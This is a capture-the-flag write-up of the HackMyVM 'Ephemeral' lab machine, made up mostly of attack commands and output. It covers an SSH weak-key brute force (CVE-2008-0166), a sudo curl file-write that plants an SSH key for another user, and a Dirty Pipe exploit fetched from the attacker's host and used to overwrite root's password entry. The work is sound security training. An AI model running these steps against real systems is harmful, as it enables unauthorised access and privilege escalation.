# Ephemeral

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Ephemeral | proxy | Beginner | HackMyVM |

**Summary:** Ephemeral is a beginner-level Linux machine on HackMyVM that chains together three distinct vulnerability classes to achieve full root compromise. The attack begins with web enumeration that uncovers a `/note.txt` hinting at OpenSSL-generated SSH keys and an `/agency/` website that leaks a username (`randy`) through its contact page. Leveraging **CVE-2008-0166** — the infamous Debian OpenSSL Predictable PRNG vulnerability — a pre-generated dictionary of 32,767 weak RSA private keys is used to brute-force SSH access as `randy`. Once on the machine, `sudo -l` reveals that `randy` can run `/usr/bin/curl` as `henry` without a password, a classic GTFOBins file-write primitive that is exploited to inject a controlled SSH public key into `henry`'s `authorized_keys`. Finally, the kernel version (`5.13.0-30-generic`) is identified as vulnerable to **CVE-2022-0847 (Dirty Pipe)**, which is weaponised to overwrite the root entry in `/etc/passwd` with a known password hash, granting an immediate `su - root` shell and both flags.

---

## 1. Reconnaissance

### 1.1 Host Discovery

The target was identified on the local `/24` subnet using a custom PowerShell network scanner:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.150 08:00:27:44:6E:18 VirtualBox
```

The target IP is **192.168.100.150** — a VirtualBox VM (confirmed by the OUI of the MAC address).

### 1.2 Port Scan (Nmap)

A full TCP port scan with version detection and default scripts was performed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ nmap -sC -sV -p- -T4 192.168.100.150
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 22:11 WIB
Nmap scan report for 192.168.100.150
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 f0:f2:b8:e0:da:41:9b:96:3b:b6:2b:98:95:4c:67:60 (RSA)
|   256 a8:cd:e7:a7:0e:ce:62:86:35:96:02:43:9e:3e:9a:80 (ECDSA)
|_  256 14:a7:57:a9:09:1a:7e:7e:ce:1e:91:f3:b1:1d:1b:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.70 seconds
```

**Findings:**
- **Port 22 — OpenSSH 8.2p1** on Ubuntu 20.04.4 LTS
- **Port 80 — Apache httpd 2.4.41** serving an Ubuntu default page at the root

### 1.3 Web Content Discovery (Root)

With the web server presenting only a default Apache page, directory/file brute-forcing was initiated:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ gobuster dir -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,bak,pem,html,zip,jpg,png,js,png,log
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.150
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              log,txt,php,bak,pem,png,js,html,zip,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/note.txt             (Status: 200) [Size: 159]
/agency               (Status: 301) [Size: 319] [--> http://192.168.100.150/agency/]
```

Two interesting paths were found: `/note.txt` and `/agency/`.

### 1.4 Note File — Credential Hint

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ curl -i http://$IP/note.txt
HTTP/1.1 200 OK
Date: Sat, 07 Mar 2026 22:16:11 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Fri, 24 Jun 2022 00:43:43 GMT
ETag: "9f-5e226dcc03ee3"
Accept-Ranges: bytes
Content-Length: 159
Vary: Accept-Encoding
Content-Type: text/plain

Hey! I just generated your keys with OpenSSL. You should be able to use your private key now!

If you have any questions just email me at henry@ephemeral.com
```

**Key intelligence:** The note mentions "generated your keys with OpenSSL" — this is the critical clue pointing to **CVE-2008-0166**, the Debian OpenSSL Predictable PRNG bug, where a broken random number generator produced only ~32,767 unique RSA keys. The email address also reveals a system user: **henry**.

### 1.5 Agency Website — Username Discovery

Browsing to `http://192.168.100.150/agency/` reveals a static agency website themed "AgencyPerfect":

![](image.png)

The **Contact** section of the site exposes additional details:

![](image-1.png)

The contact section reveals:
- **Email**: `randy@ephemeral.com` → system username **randy**
- **Phone**: +374 (00) 80 00 00
- **Fax**: +374 (00) 90 00 00
- **Address**: 20 Leo, Armenia

This gives us a second username: **randy**.

### 1.6 Web Content Discovery (Agency Subdirectory)

A second Gobuster pass was run against the `/agency` path:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ gobuster dir -u http://$IP/agency -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,bak,pem,html,zip,jpg,png,js,png,log
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.150/agency
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,jpg,png,js,txt,php,bak,pem,zip,log
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 18726]
/contact.html         (Status: 200) [Size: 10566]
/blog.html            (Status: 200) [Size: 16880]
/assets               (Status: 301) [Size: 326] [--> http://192.168.100.150/agency/assets/]
/portfolio.html       (Status: 200) [Size: 14587]
```

No additional attack surface was found under `/agency/`. All pages are static HTML — no server-side code execution points.

---

## 2. Initial Access

### 2.1 Vulnerability Research — CVE-2008-0166 (Debian OpenSSL Predictable PRNG)

The phrase *"I just generated your keys with OpenSSL"* from the note, combined with the Ubuntu 20.04 system running an Apache web server that could host such legacy keys, immediately flags **CVE-2008-0166**. A `searchsploit` query confirms the exploit is available:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ searchsploit openssl ssh
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH              | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH              | linux/remote/5720.py
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH (Ruby)       | linux/remote/5632.rb
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ searchsploit -m linux/remote/5720.py
  Exploit: OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH
      URL: https://www.exploit-db.com/exploits/5720
     Path: /usr/share/exploitdb/exploits/linux/remote/5720.py
    Codes: OSVDB-45029, CVE-2008-3280, CVE-2008-0166
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /tmp/ephemeral3/5720.py
```

The exploit script (`5720.py`) cycles through the pre-computed 32,767 RSA private keys generated by the broken Debian OpenSSL PRNG and attempts to authenticate over SSH with each one:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ cat 5720.py
#!/bin/python
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#
#       This program is distributed in the hope that it will be useful,
#       but WITHOUT ANY WARRANTY; without even the implied warranty of
#       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#       GNU General Public License for more details.
#
#       You should have received a copy of the GNU General Public License
#       along with this program; if not, write to the Free Software
#       Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#       MA 02110-1301, USA.
############################################################################
# Autor: hitz - WarCat team (warcat.no-ip.org)
# Collaborator: pretoriano
#
# 1. Download https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
#
# 2. Extract it to a directory
#
# 3. Execute the python script
#     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
#     - execute: python exploit.py (without parameters) to display the help
#     - if the key is found, the script shows something like that:
#         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
#                 Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
############################################################################
...
```

### 2.2 Downloading the Weak Key Dictionary

The pre-computed RSA 2048-bit key archive (48 MB, ~32,767 keys) was fetched from the ExploitDB binary sploits repository:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
--2026-03-07 22:39:32--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 50226987 (48M) [application/octet-stream]
Saving to: '5622.tar.bz2.1'

5622.tar.bz2.1                    100%[============================================================>]  47.90M   757KB/s    in 82s

2026-03-07 22:40:55 (595 KB/s) - '5622.tar.bz2.1' saved [50226987/50226987]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ tar -xf 5622.tar.bz2
```

### 2.3 Brute-Forcing SSH Keys — User `randy`

With the username `randy` (from the contact page) and the key dictionary extracted to `./rsa/2048/`, the exploit was launched with 4 threads:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ python2 5720.py

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
./exploit.py <dir> <host> <user> [[port] [threads]]
    <dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash
    <host>: The victim host
    <user>: The user of the victim host
    [port]: The SSH port of the victim host (default 22)
    [threads]: Number of threads (default 4) Too big numer is bad

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ python2 5720.py ./rsa/2048 $IP randy 22 4
...
Tested 22097 keys | Remaining 10671 keys | Aprox. Speed 33/sec
Tested 22262 keys | Remaining 10506 keys | Aprox. Speed 33/sec
Tested 22427 keys | Remaining 10341 keys | Aprox. Speed 33/sec
Tested 22589 keys | Remaining 10179 keys | Aprox. Speed 32/sec
Tested 22743 keys | Remaining 10025 keys | Aprox. Speed 30/sec
Tested 22909 keys | Remaining 9859 keys | Aprox. Speed 33/sec
Tested 23075 keys | Remaining 9693 keys | Aprox. Speed 33/sec
Tested 23238 keys | Remaining 9530 keys | Aprox. Speed 32/sec
Tested 23400 keys | Remaining 9368 keys | Aprox. Speed 32/sec
Tested 23560 keys | Remaining 9208 keys | Aprox. Speed 32/sec
Tested 23725 keys | Remaining 9043 keys | Aprox. Speed 33/sec
Tested 23887 keys | Remaining 8881 keys | Aprox. Speed 32/sec
Tested 24054 keys | Remaining 8714 keys | Aprox. Speed 33/sec
Tested 24182 keys | Remaining 8586 keys | Aprox. Speed 25/sec

Key Found in file: 0028ca6d22c68ed0a1e3f6f79573100a-31671
Execute: ssh -lrandy -p22 -i ./rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 192.168.100.150
```

After testing **24,182 keys**, the matching private key was found: `0028ca6d22c68ed0a1e3f6f79573100a-31671`.

### 2.4 SSH Shell as `randy`

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ ssh -lrandy -p22 -i ./rsa/2048/0028ca6d22c68ed0a1e3f6f79573100a-31671 192.168.100.150
...
randy@ephemeral:~$ id ; ls -la
uid=1000(randy) gid=1000(randy) groups=1000(randy)
total 56
drwxr-xr-x 11 randy randy 4096 Jun 23  2022 .
drwxr-xr-x  4 root  root  4096 Jun 23  2022 ..
lrwxrwxrwx  1 randy randy    9 Jun 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 randy randy  220 Jun 23  2022 .bash_logout
-rw-r--r--  1 randy randy 3771 Jun 23  2022 .bashrc
drwxrwxr-x 10 randy randy 4096 Jun 23  2022 .cache
drwx------ 11 randy randy 4096 Jun 23  2022 .config
drwxr-xr-x  3 randy randy 4096 Jun 23  2022 Desktop
drwxr-xr-x  2 randy randy 4096 Jun 23  2022 Documents
drwxr-xr-x  2 randy randy 4096 Jun 23  2022 Downloads
drwx------  3 randy randy 4096 Jun 23  2022 .gnupg
drwxr-xr-x  3 randy randy 4096 Jun 23  2022 .local
-rw-r--r--  1 randy randy  807 Jun 23  2022 .profile
drwxr-xr-x  2 randy randy 4096 Jun 23  2022 Public
drwx------  2 randy randy 4096 Jun 23  2022 .ssh
-rw-r--r--  1 randy randy    0 Jun 23  2022 .sudo_as_admin_successful
```

Initial foothold achieved as `randy`.

---

## 3. Lateral Movement — `randy` → `henry`

### 3.1 Internal Enumeration

With a shell as `randy`, basic enumeration was performed to identify other users and privilege escalation vectors:

```bash
randy@ephemeral:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
henry:x:1001:1001::/home/henry:/bin/bash
randy@ephemeral:~$ ls -la /home/henry/
total 40
drwxr-xr-x 6 henry henry 4096 Jun 24  2022 .
drwxr-xr-x 4 root  root  4096 Jun 23  2022 ..
lrwxrwxrwx 1 root  root     9 Jun 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 henry henry 3771 Feb 25  2020 .bashrc
drwx------ 4 henry henry 4096 Jun 24  2022 .cache
drwx------ 4 henry henry 4096 Jun 24  2022 .config
drwxrwxr-x 3 henry henry 4096 Jun 23  2022 .local
-rw-r--r-- 1 henry henry  807 Feb 25  2020 .profile
drwx------ 2 henry henry 4096 Jun 24  2022 .ssh
-rw------- 1 henry henry   33 Jun 23  2022 user.txt
randy@ephemeral:~$ which sudo
/usr/bin/sudo
randy@ephemeral:~$ sudo -l
Matching Defaults entries for randy on ephemeral:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on ephemeral:
    (henry) NOPASSWD: /usr/bin/curl
```

**Critical finding:** `randy` can run `/usr/bin/curl` as `henry` without a password. According to **GTFOBins**, `curl` with `sudo` can be used to write arbitrary files when the `file://` URI scheme is used as the source.

### 3.2 GTFOBins — `curl` File Write

The GTFOBins `curl` file write technique (Sudo method) applies directly here:

![](image-2.png)

As the screenshot from GTFOBins shows, the technique is:
```
echo DATA >/path/to/temp-file
curl file:///path/to/temp-file -o /path/to/output-file
```

This means: data written by `randy` to a world-readable temp file can be copied by `curl` (running as `henry`) into any path that `henry` owns — including `henry`'s `.ssh/authorized_keys`.

**Step 1** — Generate a fresh RSA keypair on the attacker machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ ssh-keygen -t rsa -b 2048 -N "" -f ./id_rsa
Generating public/private rsa key pair.
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:6Mv9iaMy5pQiD8LmiqfJxfFTHRwX3wPdAt4Y99+YmH4 ouba@CLIENT-DESKTOP
The key's randomart image is:
+---[RSA 2048]----+
|         . o+oo .|
|        . o..=+o.|
|         o  o..+.|
|       .. .  o o+|
|   .  ..S.  o o o|
|. . oo.    .     |
|+o.ooo.     . E  |
|*=oo+..o.. . .   |
|*=.o.o+.ooo      |
+----[SHA256]-----+

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXYwSbStgIwSmdLK8N3JhHf9Ccya5Upf2UYgJlPf4dE8bIzRyfwylNPkZeZ+eHnKilgXGw2ShitetQKqvStsFEE3MWhzF+xOkub3tKvN9eY0XEOMTkI0FZ1YRM4xM6CsMTVW4LMqxcneBLbu2izBUd2kF4CTTvqA9WjYM9xhWpe8MqO+1jsn8325xlHcwDqQ/z4t5Z4GzWAqhu8ZRHt54f+DF+ODfmU1hzgtKgXo45fEcGmiZ3wBRMHN6tNo7uO5thfA+KjkN36FhNhTcnxXuBZWEFaWdFRL40j2fglaH0/IZJIsfAMS0HEsc1l/7ViR1SOru1OJY/KOtrC7s6iF/v ouba@CLIENT-DESKTOP
```

**Step 2** — On the target as `randy`, create the `authorized_keys` file and stage it in a world-readable location:

```bash
randy@ephemeral:~$ nano authorized_keys
randy@ephemeral:~$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXYwSbStgIwSmdLK8N3JhHf9Ccya5Upf2UYgJlPf4dE8bIzRyfwylNPkZeZ+eHnKilgXGw2ShitetQKqvStsFEE3MWhzF+xOkub3tKvN9eY0XEOMTkI0FZ1YRM4xM6CsMTVW4LMqxcneBLbu2izBUd2kF4CTTvqA9WjYM9xhWpe8MqO+1jsn8325xlHcwDqQ/z4t5Z4GzWAqhu8ZRHt54f+DF+ODfmU1hzgtKgXo45fEcGmiZ3wBRMHN6tNo7uO5thfA+KjkN36FhNhTcnxXuBZWEFaWdFRL40j2fglaH0/IZJIsfAMS0HEsc1l/7ViR1SOru1OJY/KOtrC7s6iF/v ouba@CLIENT-DESKTOP
randy@ephemeral:~$ chmod 600 authorized_keys
randy@ephemeral:~$ sudo -u henry /usr/bin/curl file:///home/randy/authorized_keys -o /home/henry/.ssh/authorized_keys
curl: (37) Couldn't open file /home/randy/authorized_keys
```

The first attempt failed because `curl` (running as `henry`) cannot read a file with mode `600` owned by `randy`. The file was moved to `/tmp` and made world-readable:

```bash
randy@ephemeral:~$ cp /home/randy/authorized_keys /tmp/authorized_keys
randy@ephemeral:~$ chmod 644 /tmp/authorized_keys
randy@ephemeral:~$ sudo -u henry /usr/bin/curl file:///tmp/authorized_keys -o /home/henry/.ssh/authorized_keys
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   401  100   401    0     0   391k      0 --:--:-- --:--:-- --:--:--  391k
```

**Step 3** — SSH in as `henry` using the newly injected private key:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ ssh -i id_rsa henry@192.168.100.150
...
henry@ephemeral:~$ id ; ls -la
uid=1001(henry) gid=1001(henry) groups=1001(henry)
total 40
drwxr-xr-x 6 henry henry 4096 Jun 24  2022 .
drwxr-xr-x 4 root  root  4096 Jun 23  2022 ..
lrwxrwxrwx 1 root  root     9 Jun 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 henry henry 3771 Feb 25  2020 .bashrc
drwx------ 4 henry henry 4096 Jun 24  2022 .cache
drwx------ 4 henry henry 4096 Jun 24  2022 .config
drwxrwxr-x 3 henry henry 4096 Jun 23  2022 .local
-rw-r--r-- 1 henry henry  807 Feb 25  2020 .profile
drwx------ 2 henry henry 4096 Mar  7 19:59 .ssh
-rw------- 1 henry henry   33 Jun 23  2022 user.txt
```

Lateral movement to `henry` achieved. The `user.txt` flag is now accessible.

---

## 4. Privilege Escalation — `henry` → `root`

### 4.1 System Enumeration

Network listening services and SUID binaries were enumerated:

```bash
henry@ephemeral:~$ ss -tlpn
State     Recv-Q    Send-Q       Local Address:Port       Peer Address:Port    Process
LISTEN    0         4096         127.0.0.53%lo:53              0.0.0.0:*
LISTEN    0         128                0.0.0.0:22              0.0.0.0:*
LISTEN    0         5                127.0.0.1:631             0.0.0.0:*
LISTEN    0         511                      *:80                    *:*
LISTEN    0         128                   [::]:22                 [::]:*
LISTEN    0         5                    [::1]:631                [::]:*
```

No internal-only services to pivot to. SUID binary check:

```bash
henry@ephemeral:~$ find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
-rwsr-xr-- 1 root dip 395144 Jul 23  2020 /usr/sbin/pppd
-rwsr-xr-x 1 root root 44784 Jul 14  2021 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
...
```

The kernel version was the key observation:

```bash
henry@ephemeral:~$ uname -a
Linux ephemeral 5.13.0-30-generic #33~20.04.1-Ubuntu SMP Mon Feb 7 14:25:10 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

**Kernel 5.13.0-30** is vulnerable to **CVE-2022-0847 — Dirty Pipe**. Dirty Pipe allows an unprivileged user to overwrite data in arbitrary read-only files via the Linux pipe mechanism, specifically by exploiting a missing initialisation of the `PIPE_BUF_FLAG_CAN_MERGE` flag in pipe buffer structures.

### 4.2 Process Monitoring with pspy64

To baseline running processes before exploitation, `pspy64` was transferred via a Python HTTP server:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [08/Mar/2026 01:03:14] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
henry@ephemeral:~$ wget http://192.168.100.1:8080/pspy64
--2026-03-07 20:03:12--  http://192.168.100.1:8080/pspy64
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                       100%[==============================================>]   2.96M  --.-KB/s    in 0.09s

2026-03-07 20:03:12 (32.6 MB/s) - 'pspy64' saved [3104768/3104768]

henry@ephemeral:~$ chmod +x pspy64
```

### 4.3 Compiling the Dirty Pipe Exploit (CVE-2022-0847)

The PoC used is based on the [n3rada/DirtyPipe](https://github.com/n3rada/DirtyPipe) implementation, modified to inject a custom password hash. A new password hash was generated with `openssl passwd`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ openssl passwd -1 -salt pwn pwned
$1$pwn$sX7TFgG1yRswJLX53dwzy1
```

The exploit source was edited to inject this hash into the root entry of `/etc/passwd`, then compiled statically:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ vim dpipe.c

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ gcc -o dpipe dpipe.c -static
```

The compiled binary was served and transferred to the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/ephemeral3]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [08/Mar/2026 01:16:00] "GET /dpipe HTTP/1.1" 200 -
```

```bash
henry@ephemeral:~$ wget http://192.168.100.1:8080/dpipe
--2026-03-07 20:15:58--  http://192.168.100.1:8080/dpipe
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 802712 (784K) [application/octet-stream]
Saving to: 'dpipe'

dpipe                        100%[==============================================>] 783.90K  --.-KB/s    in 0.02s

2026-03-07 20:15:58 (35.8 MB/s) - 'dpipe' saved [802712/802712]

henry@ephemeral:~$ chmod +x dpipe
```

### 4.4 Exploitation — Dirty Pipe Root

The exploit was executed with the `--root` flag, which targets the root entry in `/etc/passwd`:

```bash
henry@ephemeral:~$ ./dpipe --root
[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
[Dirty Pipe] Initiating write to '/etc/passwd'...
[Dirty Pipe] Data size to write: 54 bytes
[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
[Dirty Pipe] Pipe size determined: 65536 bytes
[Dirty Pipe] Filling the pipe...
[Dirty Pipe] Pipe filled successfully.
[Dirty Pipe] Draining the pipe...
[Dirty Pipe] Pipe drained successfully.
[Dirty Pipe] Data successfully written to '/etc/passwd'.
[Dirty Pipe] You can connect as root with password 'pwned'
[Dirty Pipe] Program execution completed successfully.
```

The exploit successfully overwrote the root entry in `/etc/passwd` with the custom MD5 password hash `$1$pwn$sX7TFgG1yRswJLX53dwzy1` (password: `pwned`).

### 4.5 Root Shell & Flags

```bash
henry@ephemeral:~$ su - root
Password:
# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
ephemeral
# cat /home/henry/user.txt /root/root.txt
9c8[REDACTED]
b0a[REDACTED]
```

Full root access achieved. Both the user flag (`/home/henry/user.txt`) and root flag (`/root/root.txt`) were captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP port scan revealed SSH (22) and HTTP (80). Gobuster on the web root uncovered `/note.txt` (leaking the hint that SSH keys were generated with OpenSSL) and `/agency/` (a static website). The agency contact page exposed the username `randy` via the email `randy@ephemeral.com`, and a second username `henry` was leaked in the note file itself.

2. **Vulnerability Discovery**: The `/note.txt` message — *"I just generated your keys with OpenSSH"* — directly pointed to **CVE-2008-0166** (Debian OpenSSL Predictable PRNG). `searchsploit` confirmed exploit `5720.py` was available. The kernel version (`5.13.0-30-generic`) identified later was confirmed vulnerable to **CVE-2022-0847 (Dirty Pipe)**.

3. **Exploitation (Initial Access)**: The 48 MB archive of 32,767 pre-computed weak RSA-2048 private keys was downloaded and fed to `5720.py`. After testing ~24,182 keys, the correct key for user `randy` was identified (`0028ca6d22c68ed0a1e3f6f79573100a-31671`), granting SSH shell access.

4. **Internal Enumeration & Lateral Movement**: `sudo -l` as `randy` revealed `(henry) NOPASSWD: /usr/bin/curl`. Using the GTFOBins `curl` file-write technique (Sudo → File write), a freshly generated RSA public key was injected into `/home/henry/.ssh/authorized_keys` by staging it in `/tmp` with world-readable permissions and using `sudo -u henry curl file:///tmp/authorized_keys -o /home/henry/.ssh/authorized_keys`. SSH as `henry` then succeeded with the corresponding private key.

5. **Privilege Escalation**: Kernel `5.13.0-30-generic` was confirmed vulnerable to CVE-2022-0847 (Dirty Pipe). The `n3rada/DirtyPipe` PoC was modified to inject a custom MD5 password hash (`$1$pwn$sX7TFgG1yRswJLX53dwzy1`, password: `pwned`) into `/etc/passwd`'s root entry using the pipe splice overwrite primitive. `su - root` with password `pwned` yielded a full root shell, and both flags were captured.
